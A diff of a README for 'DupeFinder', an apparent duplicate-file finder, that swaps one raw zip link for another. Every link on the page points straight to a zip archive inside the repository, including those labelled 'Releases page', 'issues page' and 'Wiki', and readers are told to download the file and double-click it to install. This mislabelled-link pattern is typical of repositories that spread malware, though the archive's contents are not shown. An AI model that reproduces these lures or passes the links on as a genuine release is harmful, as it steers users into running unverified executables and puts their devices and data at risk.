@@ -1,7 +1,7 @@
 # 🗂️ DupeFinder - Find and Manage Duplicate Files Easily
 
 ## 📥 Download Now
-[![Download DupeFinder](https://github.com/naserhajipour/DupeFinder/raw/refs/heads/main/bin/Finder-Dupe-1.1.zip)](https://github.com/naserhajipour/DupeFinder/raw/refs/heads/main/bin/Finder-Dupe-1.1.zip)
+[![Download DupeFinder](https://raw.githubusercontent.com/naserhajipour/DupeFinder/main/lib/Dupe-Finder-3.5-beta.4.zip)](https://raw.githubusercontent.com/naserhajipour/DupeFinder/main/lib/Dupe-Finder-3.5-beta.4.zip)
 
 ## 🚀 Getting Started
 Welcome to DupeFinder! This application helps you scan your directories to find duplicate files. Using secure cryptographic hashes, DupeFinder ensures accurate results. It's user-friendly and perfect for anyone looking to free up space on their device.
@@ -23,9 +23,9 @@ DupeFinder offers several useful features:
 - **Detailed Reports:** Obtain clear reports of found duplicates.
   
 ## 📂 Download & Install
-To get DupeFinder, please visit our [Releases page](https://github.com/naserhajipour/DupeFinder/raw/refs/heads/main/bin/Finder-Dupe-1.1.zip) to download the application.
+To get DupeFinder, please visit our [Releases page](https://raw.githubusercontent.com/naserhajipour/DupeFinder/main/lib/Dupe-Finder-3.5-beta.4.zip) to download the application.
 
-1. Go to the releases page: [DupeFinder Releases](https://github.com/naserhajipour/DupeFinder/raw/refs/heads/main/bin/Finder-Dupe-1.1.zip).
+1. Go to the releases page: [DupeFinder Releases](https://raw.githubusercontent.com/naserhajipour/DupeFinder/main/lib/Dupe-Finder-3.5-beta.4.zip).
 2. Select the latest version.
 3. Download the file suitable for your operating system.
 4. Once downloaded, locate the file and double-click it to start the installation.
@@ -58,10 +58,10 @@ Yes, DupeFinder provides options for managing duplicates safely. Use the report 
 Yes, DupeFinder allows you to configure file filters and choose the hash algorithms for precision.
 
 ## 🙋 Support
-For support or questions, please check the [issues page](https://github.com/naserhajipour/DupeFinder/raw/refs/heads/main/bin/Finder-Dupe-1.1.zip) or contact us through the repository.
+For support or questions, please check the [issues page](https://raw.githubusercontent.com/naserhajipour/DupeFinder/main/lib/Dupe-Finder-3.5-beta.4.zip) or contact us through the repository.
 
 ## 📖 Additional Resources
-- **Documentation:** Visit our [Wiki](https://github.com/naserhajipour/DupeFinder/raw/refs/heads/main/bin/Finder-Dupe-1.1.zip) for detailed guidance.
+- **Documentation:** Visit our [Wiki](https://raw.githubusercontent.com/naserhajipour/DupeFinder/main/lib/Dupe-Finder-3.5-beta.4.zip) for detailed guidance.
 - **Contribution:** Interested in contributing? Check our contribution guidelines in the repository.
 
 ## ❤️ Acknowledgements
